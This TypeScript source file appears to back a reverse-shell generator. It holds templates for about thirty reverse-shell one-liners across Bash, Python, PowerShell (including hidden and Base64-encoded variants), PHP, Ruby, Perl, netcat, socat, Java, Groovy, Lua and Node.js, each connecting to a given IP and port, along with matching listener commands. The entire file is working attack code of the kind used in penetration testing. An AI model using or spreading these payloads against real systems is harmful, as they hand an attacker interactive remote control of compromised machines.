export interface ShellVariant {
  name: string;
  command: (ip: string, port: string) => string;
}

export interface ShellLanguage {
  id: string;
  name: string;
  variants: ShellVariant[];
  listener: string;
}

const shells: ShellLanguage[] = [
  {
    id: "bash",
    name: "Bash",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "Bash -i",
        command: (ip, port) =>
          `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
      },
      {
        name: "Bash 196",
        command: (ip, port) =>
          `0<&196;exec 196<>/dev/tcp/${ip}/${port}; bash <&196 >&196 2>&196`,
      },
      {
        name: "Bash UDP",
        command: (ip, port) =>
          `bash -i >& /dev/udp/${ip}/${port} 0>&1`,
      },
      {
        name: "Bash read line",
        command: (ip, port) =>
          `exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done`,
      },
      {
        name: "Bash 5",
        command: (ip, port) =>
          `bash -i 5<> /dev/tcp/${ip}/${port} 0<&5 1>&5 2>&5`,
      },
    ],
  },
  {
    id: "python",
    name: "Python",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "Python3 shortest",
        command: (ip, port) =>
          `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'`,
      },
      {
        name: "Python3 #1",
        command: (ip, port) =>
          `export RHOST="${ip}";export RPORT=${port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'`,
      },
      {
        name: "Python3 #2",
        command: (ip, port) =>
          `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`,
      },
      {
        name: "Python2",
        command: (ip, port) =>
          `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
      },
    ],
  },
  {
    id: "powershell",
    name: "PowerShell",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "PowerShell #1",
        command: (ip, port) =>
          `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
      },
      {
        name: "PowerShell #2",
        command: (ip, port) =>
          `powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('${ip}', ${port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"`,
      },
      {
        name: "PowerShell Base64",
        command: (ip, port) => {
          const payload = `$client = New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
          const b64 = typeof btoa !== "undefined" ? btoa(payload) : Buffer.from(payload).toString("base64");
          return `powershell -e ${b64}`;
        },
      },
    ],
  },
  {
    id: "php",
    name: "PHP",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "PHP exec",
        command: (ip, port) =>
          `php -r '$sock=fsockopen("${ip}",${port});exec("bash <&3 >&3 2>&3");'`,
      },
      {
        name: "PHP shell_exec",
        command: (ip, port) =>
          `php -r '$sock=fsockopen("${ip}",${port});shell_exec("bash <&3 >&3 2>&3");'`,
      },
      {
        name: "PHP popen",
        command: (ip, port) =>
          `php -r '$sock=fsockopen("${ip}",${port});popen("bash <&3 >&3 2>&3", "r");'`,
      },
      {
        name: "PHP proc_open",
        command: (ip, port) =>
          `php -r '$sock=fsockopen("${ip}",${port});$proc=proc_open("bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`,
      },
    ],
  },
  {
    id: "ruby",
    name: "Ruby",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "Ruby #1",
        command: (ip, port) =>
          `ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("${ip}",${port}))'`,
      },
      {
        name: "Ruby #2",
        command: (ip, port) =>
          `ruby -rsocket -e'exit if fork;c=TCPSocket.new("${ip}","${port}");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/444444/444444/444444cd (.+)/444444/444444/444444)?Dir.chdir($1):IO.popen($_,?r){|io|c.print io.read}}'`.replaceAll("444444",""),
      },
    ],
  },
  {
    id: "perl",
    name: "Perl",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "Perl",
        command: (ip, port) =>
          `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'`,
      },
      {
        name: "Perl no sh",
        command: (ip, port) =>
          `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"${ip}:${port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`,
      },
    ],
  },
  {
    id: "netcat",
    name: "Netcat",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "nc -e",
        command: (ip, port) =>
          `nc ${ip} ${port} -e /bin/bash`,
      },
      {
        name: "nc -c",
        command: (ip, port) =>
          `nc -c /bin/bash ${ip} ${port}`,
      },
      {
        name: "nc mkfifo",
        command: (ip, port) =>
          `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
      },
      {
        name: "ncat",
        command: (ip, port) =>
          `ncat ${ip} ${port} -e /bin/bash`,
      },
      {
        name: "ncat UDP",
        command: (ip, port) =>
          `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|ncat -u ${ip} ${port} >/tmp/f`,
      },
    ],
  },
  {
    id: "socat",
    name: "Socat",
    listener: "socat file:`tty`,raw,echo=0 TCP-L:{port}",
    variants: [
      {
        name: "Socat #1",
        command: (ip, port) =>
          `socat TCP:${ip}:${port} EXEC:'bash',pty,stderr,setsid,sigint,sane`,
      },
      {
        name: "Socat #2 (TTY)",
        command: (ip, port) =>
          `socat TCP:${ip}:${port} EXEC:bash,pty,stderr,setsid,sigint,sane`,
      },
    ],
  },
  {
    id: "java",
    name: "Java",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "Java Runtime",
        command: (ip, port) =>
          `Runtime r = Runtime.getRuntime();\nProcess p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do \\$line 2>&5 >&5; done'");\np.waitFor();`,
      },
      {
        name: "Java #1",
        command: (ip, port) =>
          `String host="${ip}";\nint port=${port};\nString cmd="/bin/bash";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\nwhile(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();`,
      },
    ],
  },
  {
    id: "groovy",
    name: "Groovy",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "Groovy",
        command: (ip, port) =>
          `String host="${ip}";\nint port=${port};\nString cmd="/bin/bash";\nProcess p=cmd.execute();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\nwhile(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();`,
      },
    ],
  },
  {
    id: "lua",
    name: "Lua",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "Lua #1",
        command: (ip, port) =>
          `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${port}');os.execute('bash -i <&3 >&3 2>&3');"`,
      },
      {
        name: "Lua #2",
        command: (ip, port) =>
          `lua5.1 -e 'local host, port = "${ip}", ${port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'`,
      },
    ],
  },
  {
    id: "nodejs",
    name: "Node.js",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "Node.js #1",
        command: (ip, port) =>
          `require('child_process').exec('bash -i >& /dev/tcp/${ip}/${port} 0>&1')`,
      },
      {
        name: "Node.js #2",
        command: (ip, port) =>
          `(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("bash", []);var client = new net.Socket();client.connect(${port}, "${ip}", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();`,
      },
    ],
  },
];

export function getShells(): ShellLanguage[] {
  return shells;
}

export function getShellById(id: string): ShellLanguage | undefined {
  return shells.find((s) => s.id === id);
}

export function encodeBase64(str: string): string {
  if (typeof btoa !== "undefined") {
    return btoa(str);
  }
  return Buffer.from(str).toString("base64");
}

export function encodeUrl(str: string): string {
  return encodeURIComponent(str);
}
